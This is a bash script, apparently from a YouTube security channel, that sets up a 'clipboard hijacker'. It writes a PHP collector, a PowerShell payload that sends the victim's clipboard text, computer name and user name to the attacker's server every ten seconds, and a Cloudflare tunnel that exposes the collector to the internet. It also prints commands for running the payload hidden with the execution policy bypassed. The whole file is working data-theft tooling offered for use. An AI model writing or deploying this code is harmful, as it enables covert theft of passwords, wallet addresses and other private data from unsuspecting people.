#!/bin/bash
# RGSecurityTeam - Clipboard Hijacker
# YouTube: www.youtube.com/@RGSecurityTeam

version="0.2"

# ANSI colors
red="$(printf '\033[31m')"  
green="$(printf '\033[32m')"  
orange="$(printf '\033[33m')"  
blue="$(printf '\033[34m')" 
cyan="$(printf '\033[36m')"  
white="$(printf '\033[37m')" 
redbg="$(printf '\033[41m')"
nc="$(printf '\e[0m\n')" #no color


# Default configuration
IP="127.0.0.1"
PORT="3333"
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"

## BANNER 
banner() {
echo -e "\n"
echo -e "${cyan}    ███████${orange}╗${cyan} █████${orange}╗ ${cyan}██${orange}╗${cyan}      ██████${orange}╗ ${cyan}██████${orange}╗${cyan} ███${orange}╗${cyan}   ██${orange}╗ ${nc}"
echo -e "${cyan}    ██${orange}╔════╝${cyan}██${orange}╔══${cyan}██${orange}╗${cyan}██${orange}║     ${cyan}██${orange}╔════╝${cyan}██${orange}╔═══${cyan}██${orange}╗${cyan}████${orange}╗  ${cyan}██${orange}║ ${nc}"
echo -e "${cyan}    █████${orange}╗  ${cyan}███████${orange}║${cyan}██$orange║     ${cyan}██${orange}║     ${cyan}██${orange}║   ${cyan}██${orange}║${cyan}██$orange╔${cyan}██${orange}╗ ${cyan}██${orange}║ ${nc}"
echo -e "${cyan}    ██${orange}╔══╝  ${cyan}██${orange}╔══${cyan}██${orange}║${cyan}██${orange}║     ${cyan}██${orange}║     ${cyan}██${orange}║   ${cyan}██$orange║${cyan}██${orange}║╚${cyan}██${orange}╗${cyan}██${orange}║ ${nc}"
echo -e "${cyan}    ██${orange}║     ${cyan}██${orange}║  ${cyan}██${orange}║${cyan}███████${orange}╗╚${cyan}██████${orange}╗╚${cyan}██████${orange}╔╝${cyan}██$orange║ ╚${cyan}████${orange}║ ${nc}"
echo -e "${orange}    ╚═╝     ╚═╝  ╚═╝╚══════╝ ╚═════╝ ╚═════╝ ╚═╝  ╚═══╝ "
echo -e "${white}${green}    Clip Board Hijacker by ${redbg}${white}RGSecurityTeam.${nc}${white} Version:$version ${nc}"
}


terminate() {
    echo -e "\n${red}[!] Program terminated.${nc}"
    pkill -f "php -S" 2>/dev/null
    pkill -f cloudflared 2>/dev/null
    exit 0
}

if [ -e "clipboard_logger.ps1" ]; then
rm clipboard_logger.ps1
fi

trap terminate INT

check_dependencies() {
    local deps=("php")
    for dep in "${deps[@]}"; do
        if ! command -v "$dep" &> /dev/null; then
            echo -e "${red}[!] $dep is required but not installed.${nc}"
            exit 1
        fi
    done
}

download_cloudflared() {
    if [[ ! -f "cloudflared" ]]; then
        echo -e "${green}[+] Downloading cloudflared...${nc}"
        arch=$(uname -m)
        case $arch in
            *arm*|*Android*) url="cloudflared-linux-arm" ;;
            *aarch64*) url="cloudflared-linux-arm64" ;;
            *x86_64*) url="cloudflared-linux-amd64" ;;
            *) url="cloudflared-linux-386" ;;
        esac
        
        wget -q "https://github.com/cloudflare/cloudflared/releases/latest/download/$url" -O cloudflared
        chmod +x cloudflared
        echo -e "${green}[+] Cloudflared installed.${nc}"
    fi
}

create_server_files() {
    mkdir -p .server
    
    # Create PHP endpoint
    cat > .server/index.php << 'EOF'
<?php
$logFile = __DIR__ . '/clipboard_log.txt';

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $clipboard_data = $_POST['clipboard_data'] ?? '';
    $machine_name = $_POST['machine_name'] ?? 'Unknown';
    $user_name = $_POST['user_name'] ?? 'Unknown';
    
    if (!empty($clipboard_data)) {
        $entry = "[" . date('Y-m-d H:i:s') . "] Machine: $machine_name | User: $user_name\n";
        $entry .= "Clipboard: " . str_replace(["\r", "\n"], " ", substr($clipboard_data, 0, 1000)) . "\n";
        $entry .= "---\n";
        
        file_put_contents($logFile, $entry, FILE_APPEND | LOCK_EX);
        echo "OK";
    } else {
        echo "No data";
    }
} else {
    echo "Clipboard Hijacker Server - Active";
}
?>
EOF

    # Create PowerShell script template
    mkdir -p .templates
    cat > .templates/payload.ps1 << 'EOF'
Add-Type -AssemblyName System.Windows.Forms

$ip = "IP_ADDRESS"
$port = "PORT_NUMBER"
$url = "http://${ip}:${port}/index.php"

while ($true) {
    try {
        $clipText = [System.Windows.Forms.Clipboard]::GetText()
        if ($clipText -and $clipText.Trim()) {
            $body = @{
                clipboard_data = $clipText
                machine_name = $env:COMPUTERNAME
                user_name = $env:USERNAME
            }
            Invoke-RestMethod -Uri $url -Method Post -Body $body -ErrorAction SilentlyContinue
        }
    } catch { }
    Start-Sleep -Seconds 10
}
EOF

    touch .server/clipboard_log.txt
    echo -e "${green}[+] Server files created.${nc}"
    sleep 1
}

is_port_available() {
    local port=$1
    ! lsof -Pi :$port -sTCP:LISTEN -t >/dev/null 2>&1
}

start_php_server() {
    local ip=$1
    local port=$2
    
    if ! is_port_available $port; then
        echo -e "${red}[!] Port $port is already in use.${nc}"
        return 1
    fi
    
    php -S "$ip:$port" -t .server/ > /dev/null 2>&1 &
    local pid=$!
    sleep 2
    
    if kill -0 $pid 2>/dev/null; then
        echo $pid
        return 0
    else
        echo -e "${red}[!] Failed to start PHP server.${nc}"
        return 1
    fi
}

setup_local_server() {
    { clear; banner; echo; }
    echo -e "${orange}[*] Local Server Setup${nc}\n"
    
    read -p "Enter IP [Default:127.0.0.1]: " custom_ip
    read -p "Enter PORT [Default:3333]: " custom_port
    
    IP=${custom_ip:-127.0.0.1}
    PORT=${custom_port:-3333}
    
    # Validate port
    if ! [[ "$PORT" =~ ^[0-9]+$ ]] || [ "$PORT" -lt 1 ] || [ "$PORT" -gt 65535 ]; then
        echo -e "${red}[!] Invalid port number. Using default 3333.${nc}"
        PORT=3333
    fi
    
    # Update PowerShell script
    sed -e "s/IP_ADDRESS/$IP/g" -e "s/PORT_NUMBER/$PORT/g" .templates/payload.ps1 > clipboard_logger.ps1
    echo -e "${green}[+] Payload configured for $IP:$PORT${nc}"
    { clear; banner; start_monitoring; }
    return 0
}

setup_cloudflare_tunnel() {
    { clear; banner; echo; }
    echo -e "${orange}[*] Cloudflare Tunnel Setup${nc}\n"
    
    # Start local server for tunnel
    local php_pid=$(start_php_server "127.0.0.1" "3333")
    if [ $? -ne 0 ]; then
        echo -e "${red}[!] Failed to start local server.${nc}"
        return 1
    fi
    
    echo -e "${green}[+] Starting Cloudflare tunnel...${nc}"
    ./cloudflared tunnel --url "http://127.0.0.1:3333" --logfile .cldf.log > /dev/null 2>&1 &
    local cldf_pid=$!
    sleep 12
    
    # Get tunnel URL
    local tunnel_url=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' ".cldf.log" 2>/dev/null | head -n1)
    
    if [[ -n "$tunnel_url" ]]; then
        local tunnel_host=$(echo "$tunnel_url" | sed 's|https://||')
        
        # Update PowerShell script for tunnel
        sed -e "s/IP_ADDRESS/$tunnel_host/g" -e "s/PORT_NUMBER/80/g" .templates/payload.ps1 > clipboard_logger.ps1
        
        echo -e "${green}[+] Cloudflare tunnel: $tunnel_url${nc}"
        echo -e "${green}[+] Payload configured for tunnel${nc}"

        # Store tunnel info
        echo "$cldf_pid" > .tunnel.pid
        IP="127.0.0.1"
        PORT="3333"

        { clear; banner; start_monitoring; }
    else
        echo -e "${red}[!] Cloudflare tunnel failed. Using local server.${nc}"
        kill $php_pid 2>/dev/null
        setup_local_server
    fi
    
    return 0
}

start_monitoring() {
    { clear; banner; echo; }
    echo -e "${orange}[*] Starting Clipboard Monitoring${nc}\n"
    echo -e "Server: ${blue}http://$IP:$PORT${nc}"
    echo -e "Log file: ${blue}${SCRIPT_DIR}/.server/clipboard_log.txt${nc}"
    echo -e "\n${green}[+] Waiting for clipboard data...${orange} (Ctrl+C to stop)${nc}\n"
    
    # Start PHP server if not already running
    if ! pgrep -f "php -S $IP:$PORT" > /dev/null; then
        start_php_server "$IP" "$PORT" > /dev/null
    fi
    
    # Show real-time logs
    tail -f .server/clipboard_log.txt &
    local tail_pid=$!
    
    trap "kill $tail_pid 2>/dev/null; pkill -f 'php -S' 2>/dev/null; echo -e '\n${red}[!] Monitoring stopped.${nc}'; exit 0" INT
    wait
}

show_status() {
    { clear; banner; echo; }
    echo -e "${orange}[*] Server Status${nc}\n"
    
    if pgrep -f "php -S" > /dev/null; then
        echo -e "${green}[+] Server is running${nc}"
        echo -e "Log entries: $(wc -l < .server/clipboard_log.txt 2>/dev/null || echo 0)"
        echo -e "\nLast 3 entries:"
        tail -3 .server/clipboard_log.txt 2>/dev/null || echo "No data yet"
    else
        echo -e "${red}[!] Server is not running${nc}"
    fi
    
    read -n 1 -s -p "Press any key to continue..."
}

stop_services() {
    stop_services() {
    echo -e "${orange}[*] Stopping all services...${nc}"
    
    # Stop PHP server
    if [[ -f ".php.pid" ]]; then
        local php_pid=$(cat .php.pid)
        kill $php_pid 2>/dev/null
        rm -f .php.pid
    fi
    pkill -f "php -S" 2>/dev/null
    
    # Stop cloudflared
    if [[ -f ".tunnel.pid" ]]; then
        local tunnel_pid=$(cat .tunnel.pid)
        kill $tunnel_pid 2>/dev/null
        rm -f .tunnel.pid
    fi
    pkill -f cloudflared 2>/dev/null
    
    echo -e "${green}[+] All services stopped.${nc}"
    sleep 2
}
}

show_powershell_commands() {
    { clear; banner; echo; }
    echo -e "${orange}[*] PowerShell Commands${nc}\n"
    echo -e "${green}Run this in PowerShell:${nc}"
    echo -e "${cyan}powershell -ExecutionPolicy Bypass -File clipboard_logger.ps1${nc}\n"
    echo -e "${green}For hidden execution:${nc}"
    echo -e "${cyan}Start-Process powershell -ArgumentList \"-WindowStyle Hidden -ExecutionPolicy Bypass -File clipboard_logger.ps1\"${nc}\n"
    echo -e "${green}To stop:${nc}"
    echo -e "${cyan}Stop-Process -Name powershell -Force${nc}\n"
    read -n 1 -s -p "Press any key to continue..."
}

main_menu() {
    while true; do
        { clear; banner; echo; }
        echo -e "${orange}Main Menu${nc}\n"
        echo -e "1) Setup Local Server"
        echo -e "2) Setup Cloudflare Tunnel" 
        echo -e "3) Start Monitoring"
        echo -e "4) Check Status"
        echo -e "5) Stop Services"
        echo -e "6) PowerShell Commands"
        echo -e "7) Exit\n"
        
        read -p "Select option: " choice
        
        case $choice in
            1 | 01) setup_local_server && read -n 1 -s -p "Press any key to continue..." ;;
            2 | 02) setup_cloudflare_tunnel && read -n 1 -s -p "Press any key to continue..." ;;
            3 | 03) start_monitoring ;;
            4 | 04) show_status ;;
            5 | 05) stop_services ;;
            6 | 06) show_powershell_commands ;;
            7 | 07) terminate ;;
            *) echo -e "${red}[!] Invalid option${nc}"; sleep 1 ;;
        esac
    done
}

# Initialize
check_dependencies
download_cloudflared
create_server_files
main_menu